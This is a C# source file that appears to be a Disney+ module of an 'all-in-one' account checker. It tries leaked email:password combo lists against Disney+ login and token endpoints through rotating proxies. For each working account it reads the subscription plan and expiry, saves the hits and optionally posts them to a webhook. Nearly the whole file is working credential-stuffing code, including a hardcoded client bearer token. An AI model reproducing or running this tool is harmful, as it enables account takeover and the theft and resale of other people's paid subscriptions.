using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Bolt_AIO
{
    internal class Disneymod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;

                            var accessToken = DisneyPlusGetToken();

                            if (accessToken == "") continue;

                            req.AddHeader("Content-Type", "application/json");
                            req.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                            req.Authorization = "Bearer " + accessToken;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse = req.Post(new Uri("https://global.edge.bamgrid.com/idp/login"),
                                    new BytesContent(Encoding.Default.GetBytes("{\"email\":\"" + array[0] +
                                                                               "\",\"password\":\"" + array[1] +
                                                                               "\"}")))
                                .ToString();

                            if (strResponse.Contains("id_token"))
                            {
                                var jsonObj = (JObject) JsonConvert.DeserializeObject(strResponse);

                                var id_token = jsonObj["id_token"].ToString();

                                var captures = "";

                                while (captures == "")
                                    captures = DisneyPlusGetCaptures(accessToken, id_token);

                                if (captures == "Free" || captures == "Expired")
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    if (Program.lorc == "LOG")
                                        Settings.PrintFree("Disneyplus", array[0] + ":" + array[1]);
                                    Export.AsResult("/Disneyplus_frees", array[0] + ":" + array[1]);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Disneyplus Free");
                                }
                                else
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Disneyplus", array[0] + ":" + array[1]);
                                    Export.AsResult("/Disneyplus_hits", array[0] + ":" + array[1] + " | " + captures);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Disneyplus");
                                }
                            }
                            else if (strResponse.Contains("Bad credentials"))
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        private static string DisneyPlusGetToken()
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.IgnoreProtocolErrors = true;

                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        req.Authorization =
                            "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";

                        var strResponse = req.Post(new Uri("https://global.edge.bamgrid.com/devices"),
                                new BytesContent(Encoding.Default.GetBytes(
                                    "{\"deviceFamily\":\"browser\",\"applicationRuntime\":\"chrome\",\"deviceProfile\":\"windows\",\"attributes\":{}}")))
                            .ToString();

                        var assertion = "";
                        if (strResponse.Contains("assertion"))
                            assertion = Regex.Match(strResponse, "assertion\":\"(.*?)\"").Groups[1].Value;
                        if (assertion == "") return "";

                        /////////////////////////////////////////////////////////////////

                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        req.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        req.Authorization =
                            "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";

                        var strResponse2 = req.Post(new Uri("https://global.edge.bamgrid.com/token"),
                                new BytesContent(Encoding.Default.GetBytes(
                                    $"grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token={assertion}&subject_token_type=urn:bamtech:params:oauth:token-type:device")))
                            .ToString();

                        if (strResponse2.Contains("access_token"))
                            assertion = Regex.Match(strResponse2, "\"access_token\":\"(.*?)\"").Groups[1].Value;

                        return assertion;
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "";
        }

        private static string DisneyPlusGetCaptures(string accessToken, string id_token)
        {
            for (var i = 0; i < 10; i++)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.IgnoreProtocolErrors = true;

                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        req.Authorization = "Bearer " + accessToken;

                        var strResponse = req.Post(new Uri("https://global.edge.bamgrid.com/accounts/grant"),
                                new BytesContent(Encoding.Default.GetBytes("{\"id_token\":\"" + id_token + "\"}")))
                            .ToString();

                        var assertion = "";
                        if (strResponse.Contains("assertion"))
                            assertion = Regex.Match(strResponse, "\"assertion\":\"(.*?)\"").Groups[1].Value;
                        if (assertion == "") return "";

                        /////////////////////////////////////////////////////////////////

                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        req.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        req.Authorization =
                            "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";

                        var strResponse2 = req.Post(new Uri("https://global.edge.bamgrid.com/token"),
                                new BytesContent(Encoding.Default.GetBytes(
                                    $"grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token={assertion}&subject_token_type=urn:bamtech:params:oauth:token-type:account")))
                            .ToString();

                        if (strResponse2.Contains("access_token"))
                            assertion = Regex.Match(strResponse2, "\"access_token\":\"(.*?)\"").Groups[1].Value;
                        if (assertion == "") return "";

                        /////////////////////////////////////////////////////////////////

                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        req.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        req.Authorization = "Bearer " + assertion;

                        var strResponse3 = req.Get(new Uri("https://global.edge.bamgrid.com/subscriptions")).ToString();

                        if (strResponse3.Contains("[]") && !strResponse3.Contains("name")) return "Free";

                        if (strResponse3.Contains("name"))
                        {
                            var jsonObj = (JObject) ((JArray) JsonConvert.DeserializeObject(strResponse3))[0];
                            var plan = jsonObj["products"][0]["name"].ToString();
                            var expDate = (DateTime) jsonObj["expirationDate"];
                            if (DateTime.Now > expDate) return "Expired";

                            return "Plan: " + plan + " - Expiration Date: " + expDate.ToString("dd/MM/yyyy");
                        }
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "";
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}